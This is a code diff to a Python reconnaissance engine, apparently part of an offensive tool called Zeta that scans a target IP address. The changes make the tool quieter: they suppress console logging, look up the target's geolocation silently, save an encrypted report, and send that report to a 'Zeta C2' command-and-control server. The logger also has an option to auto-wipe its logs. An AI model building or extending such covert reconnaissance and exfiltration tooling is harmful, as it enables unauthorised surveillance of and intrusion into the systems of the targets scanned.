@@ -59,13 +59,13 @@ class ReconEngine:
             "session_id": f"zeta_{target_ip.replace('.', '_')}"
         }
 
-        # Initialize logger early
+        # Initialize logger early (disable logger console when we have styled output)
         self.logger = SecureLogger(
             target_ip=target_ip,
             log_dir="zeta_logs",
             encrypt=True,
             auto_wipe=auto_wipe_logs,
-            console_output=console_output
+            console_output=False  # We use styled output instead
         )
 
         # Initialize exfil if C2 provided
@@ -247,41 +247,25 @@ class ReconEngine:
         # Finalize report
         self.report["scan_time"] = round(time.time() - start_time, 2)
         
-        # Add geolocation info
+        # Add geolocation info silently
         try:
             geo_info = get_geo_info(self.target_ip)
             self.report["geo"] = geo_info
-            if self.console_output and geo_info:
-                print_section("GEOLOCATION INFO")
-                if geo_info.get("country"):
-                    print_data("Country", geo_info["country"])
-                if geo_info.get("city"):
-                    print_data("City", geo_info["city"])
-                if geo_info.get("isp"):
-                    print_data("ISP", geo_info["isp"])
-                if geo_info.get("lat") and geo_info.get("lon"):
-                    maps_url = f"https://www.google.com/maps?q={geo_info['lat']},{geo_info['lon']}"
-                    earth_url = f"https://earth.google.com/web/@{geo_info['lat']},{geo_info['lon']},0a,1000d,35y,0h,0t,0r"
-                    print_data("Google Maps", maps_url)
-                    print_data("Google Earth", earth_url)
         except Exception as e:
             self.logger.warn(f"Geolocation lookup failed: {e}")
         
-        # Display comprehensive CamXploit-style deployment analysis
-        if self.console_output:
-            print_deployment_analysis(self.report)
+        # Save encrypted report silently (for forensics/backup)
+        report_file = self.logger.save_full_report(self.report)
+        self.report["report_file"] = report_file
         
-        self.logger.success("Full reconnaissance completed")
-
-        # Step 5: Exfiltrate if C2 configured
+        # Exfiltrate if C2 configured (silent)
         if self.exfil_engine:
             self.exfil_engine.exfil(self.report, persistent=False)
             self.logger.info("Report exfiltrated to Zeta C2")
-
-        # Step 6: Save local encrypted report
-        report_file = self.logger.save_full_report(self.report)
+        
+        # Display comprehensive CamXploit-style deployment analysis (all-in-one)
         if self.console_output:
-            print_success(f"Full report saved: {report_file}")
+            print_deployment_analysis(self.report)
 
         return self.report
 
